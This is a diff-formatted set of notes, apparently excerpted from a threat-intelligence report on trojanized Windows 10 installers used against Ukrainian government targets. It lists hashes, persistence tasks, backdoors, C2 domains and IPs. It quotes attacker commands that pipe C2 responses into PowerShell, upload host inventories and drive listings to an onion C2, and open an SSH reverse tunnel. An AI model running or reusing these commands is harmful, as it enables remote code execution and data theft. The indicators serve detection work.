@@ -1,0 +1,170 @@
+ Trojanized Windows 10 Operating System Installers Targeted Ukrainian Government
+
+ https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government
+
+ssh -R 80:localhost:80 -i defaultssh localhost[.]run -o stricthostkeychecking=no >> sysinfo
+
+b7a0cd867ae0cbaf0f3f874b26d3f4a4
+Ukrainian torrent tracker called toloka.to
+https://rutracker[.]net
+.onion TOR domains
+trojanized ISOs is novel in espionage operations and included anti-detection capabilities indicates that the actors behind this activity are security conscious and patient
+b7a0cd867ae0cbaf0f3f874b26d3f4a4
+gatherNetworkInfo.vbs script or waqmcons.exe process.
+Legitimate GatherNetworkInfo task configuration
+C:\Windows\System32\Tasks\Microsoft\Windows\Customer Experience Improvement Program\Consolidator (MD5:  ed7ab9c74aad08b938b320765b5c380d)
+Executes: powershell.exe (curl.exe -k https://ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid.onion[.]moe -H ('h:'+(wmic csproduct get UUID)))
+C:\Windows\System32\Tasks\Microsoft\Windows\NetTrace\GatherNetworkInfo (MD5:  1433dd88edfc9e4b25df370c0d8612cf)
+Executes: powershell.exe curl.exe -k https://ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid[.]onion.ws -H ('h:'+(wmic csproduct get UUID)) | powershell.exe
+
+onion[.]ws
+SetupComplete.cmd
+    SetupComplete.cmd (MD5: 84B54D2D022D3DF9340708B992BF6669)
+        Batch script to disable legitimate services and activate Windows
+        File currently hosted on ISO
+    SetupComplete.cmd (MD5: 67C4B2C45D4C5FD71F6B86FA0C71BDD3)
+        Batch script to disable legitimate services and activate Windows
+        File recovered through forensic file carving
+    SetupComplete.cmd (MD5: 5AF96E2E31A021C3311DFDA200184A3B)
+        Batch script to disable legitimate services and activate Windows
+        File recovered through forensic file carving
+
+
+curl.exe -k https://ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid.onion[.]moe -H h:filefile-file-file-file-filefilefile –output temp.zip
+
+chcp 65001; [console]::outputencoding = [system.text.encoding]::UTF8; Start-Process powershell -argument “Get-ComputerInfo | Export-Csv -path sysinfo -encoding UTF8” -wait -nonewwindow; curl.exe -H (‘h:’+(wmic csproduct get UUID)) –data-binary “@sysinfo” -k https://ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid.onion[.]moe; rm sysinfo
+
+    bundle.zip (MD5: 66da9976c96803996fc5465decf87630)
+        Legitimate TOR Installer bundle
+        Downloaded from https://ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid.onion[.]moe/bundle.zip
+        Downloaded from https:// 56nk4qmwxcdd72yiaro7bxixvgf5awgmmzpodub7phmfsqylezu2tsid.onion[.]moe/bundle.zip
+
+Use of Sheret HTTP Server and localhost[.]run
+In some instances, the threat actor deployed a publicly available HTTP server called Sheret to conduct data theft interactively on victim devices. The threat actor configured Sheret to server locally, then using SSH created a tunnel from the local device to the service localhost[.]run.
+
+The command used for SSH tunnelling was:
+
+    ssh -R 80:localhost:80 -i defaultssh localhost[.]run -o stricthostkeychecking=no >> sysinfo
+
+This command configures the local system to create a tunnel from the local device to the website localhost.run.
+
+    C:\Windows\System32\HTTPDService.exe (MD5: a0d668eec4aebaddece795addda5420d)
+        Sheret web server
+        Publicly available as a build from https://github.com/ethanpil/sheret
+        Compiled date: 1970/01/01 00:00:00
+
+The service named “Microsoft Delivery Network” was created to execute %SYSTEM32%\MicrosoftDeliveryNetwork\MicrosoftDeliveryCenter with the arguments “56nk4qmwxcdd72yiaro7bxixvgf5awgmmzpodub7phmfsqylezu2tsid.onion[.]moe powershell.exe” via the Windows SC command.
+
+SPAREPART is executed as a Windows Service DLL, which upon execution will receive the tasking and execute via piping the commands into the PowerShell process.
+SPAREPART has a unique randomization for its sleep timer.
+This enables the threat actor to randomise beaconing timing. The randomisation is seeded of the base address of the image in memory, this value is then used to determine a value between 0 and 59. This value acts as the sleep timer in minutes. As the backdoor starts up, it’ll sleep for up to 59 minutes before reaching out to the C2. Any subsequent requests will be delayed for between 3 and 4 hours.
+
+the hard coded user agent “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0”.
+
+    MicrosoftDeliveryCenter (MD5: f9cd5b145e372553dded92628db038d8)
+        SPAREPART backdoor
+        Compiled on: 2022/11/28 02:32:33
+        PDB path: C:\Users\user\Desktop\ImageAgent\ImageAgent\PreAgent\src\builder\agent.pdb
+
+UNC4166 deployed the payload AzureSettingSync.dll and configured its execution via a schedule task named AzureSync on at least one device. The schedule task was configured to execute AzureSync via rundll32.exe.
+
+AzureSettingSync is a BEACON payload configured to communicate with cdnworld.org, which was registered on the June 24, 2022 with an SSL certificate from Let’s Encrypt dated the 26th of August 2022.
+
+    C:\Windows\System32\AzureSettingSync.dll (MD5: 59a3129b73ba4756582ab67939a2fe3c)
+        BEACON backdoor
+        Original name: tr2fe.dll
+        Compiled on: 1970/01/01 00:00:00
+        Dropped by 529388109f4d69ce5314423242947c31 (BEACON)
+        Connects to https://cdnworld[.]org/34192–general-feedback/suggestions/35703616-cdn–
+        Connects to https://cdnworld[.]org/34702–general/sync/42823419-cdn
+
+Due to remediation on some compromised devices, we believe that the BEACON instances were quarantined on the devices. Following this, we identified the threat actor had deployed a STOWAWAY backdoor on the victim device.
+
+    C:\Windows\System32\splwow86.exe (MD5: 0f06afbb4a2a389e82de6214590b312b)
+        STOWAWAY backdoor
+        Compiled on: 1970/01/01 00:00:00
+        Connects to 193.142.30.166:443
+    %LOCALAPPDATA%\\SODUsvc.exe (MD5: a8e7d8ec0f450037441ee43f593ffc7c)
+        STOWAWAY backdoor
+        Compiled on: 1970/01/01 00:00:00
+        Connects to 91.205.230.66:8443
+
+Indicators
+Scheduled Tasks
+
+    C:\Windows\System32\Tasks\MicrosoftWindowsNotificationCenter (MD5: 16b21091e5c541d3a92fb697e4512c6d)
+        Schedule task configured to execute Powershell.exe with the command line curl.exe -k https://ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid.onion[.]moe -H ('h:'+(wmic csproduct get UUID)) | powershell
+
+Trojanized Scheduled Tasks
+
+    C:\Windows\System32\Tasks\Microsoft\Windows\NetTrace\GatherNetworkInfo (MD5: 1433dd88edfc9e4b25df370c0d8612cf)
+    C:\Windows\System32\Tasks\Microsoft\Windows\Customer Experience Improvement Program\Consolidator (MD5: ed7ab9c74aad08b938b320765b5c380d)
+
+BEACON Backdoor
+
+    C:\Windows\System32\AzureSettingSync.dll (MD5: 59a3129b73ba4756582ab67939a2fe3c)
+
+Scheduled Tasks for Persistence
+
+    C:\Windows\System32\Tasks\Microsoft\Windows\Maintenance\AzureSync
+    C:\Windows\System32\Tasks\Microsoft\Windows\Maintenance\AzureSyncDaily
+
+STOWAWAY Backdoor
+
+    C:\Windows\System32\splwow86.exe (MD5: 0f06afbb4a2a389e82de6214590b312b)
+    %LOCALAPPDATA%\SODUsvc.exe (MD5: a8e7d8ec0f450037441ee43f593ffc7c)
+
+Services for Persistence
+
+    Printer driver host for applications
+    SODUsvc
+
+On Host Recon Commands
+
+    Get-ChildItem -Recurse -Force -Path ((C:)+’') | Select-Object -Property Psdrive, FullName, Length, Creationtime, lastaccesstime, lastwritetime | Export-Csv -Path sysinfo -encoding UTF8; Compress-Archive -Path sysinfo -DestinationPath sysinfo.zip -Force;
+    Get-ComputerInfo | Export-Csv -path sysinfo -encoding UTF8
+    invoke-restmethod http://ip-api[.]com/json | Export-Csv -path sysinfo -encoding UTF8
+    Get-Volume | Where-Object {.DriveLetter -and .DriveLetter -ne ‘C’ -and .DriveType -eq ‘Fixed’} | ForEach-Object {Get-ChildItem -Recurse -Directory (.DriveLetter+‘:’) | Select-Object -Property Psdrive, FullName, Length, Creationtime, lastaccesstime, lastwritetime | Export-Csv -Path sysinfo -encoding UTF8; Compress-Archive -Path sysinfo -DestinationPath sysinfo -Force; curl.exe -H (’h:’+(wmic csproduct get UUID)) –data-binary ‘@sysinfo.zip’ -k https://ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid.onion[.]moe
+    chcp 65001; [console]::outputencoding = [system.text.encoding]::UTF8; Start-Process powershell -argument “Get-ComputerInfo | Export-Csv -path sysinfo -encoding UTF8” -wait -nonewwindow; curl.exe -H (‘h:’+(wmic csproduct get UUID)) –data-binary “@sysinfo” -k https://ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid.onion[.]moe; rm sysinfo
+
+Trojanized Windows Image Network Indicators
+
+Indicators of Compromise
+    
+
+Signature
+
+56nk4qmwxcdd72yiaro7bxixvgf5awgmmzpodub7phmfsqylezu2tsid[.]onion[.]moe
+
+ 
+    
+
+Malicious Windows Image Tor C2
+
+ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid[.]onion[.]moe
+
+ 
+
+ 
+    
+
+Malicious Windows Image Tor C2
+
+ufowdauczwpa4enmzj2yyf7m4cbsjcaxxoyeebc2wdgzwnhvwhjf7iid[.]onion[.]ws
+
+ 
+    
+
+Malicious Windows Image Tor C2
+BEACON C2s
+
+    https://cdnworld[.]org/34192–general-feedback/suggestions/35703616-cdn–
+    https://cdnworld[.]org/34702–general/sync/42823419-cdn
+
+STOWAWAY C2s
+
+    193.142.30[.]166:443          
+    91.205.230[.]66:8443
+
+
+
